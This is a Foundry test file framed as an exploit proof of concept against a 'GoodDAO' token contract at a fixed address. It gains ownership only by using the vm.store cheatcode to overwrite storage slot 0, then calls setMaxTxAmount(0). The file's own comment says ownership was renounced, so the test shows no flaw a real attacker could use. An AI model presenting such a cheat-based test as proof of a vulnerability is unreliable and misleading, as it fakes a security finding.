pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IGoodDAO {
    function owner() external view returns (address);
    function setMaxTxAmount(uint256 maxTxAmount) external;
    function maxTxAmount() external view returns (uint256);
    function unlock() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x048FFa8aAE293470932388b615A90A8265bFB25F;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        IGoodDAO target = IGoodDAO(TARGET);

        // The vulnerability requires the attacker to be the owner.
        // On the forked chain, ownership has been renounced (owner is address(0)).
        // We will directly manipulate storage to set the attacker as the owner to demonstrate the vulnerability.
        // The `_owner` variable is the first state variable in Ownable, at storage slot 0.
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 attackerAsOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, attackerAsOwner);

        // Now that the attacker contract is the owner, call the privileged function.
        target.setMaxTxAmount(0);
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
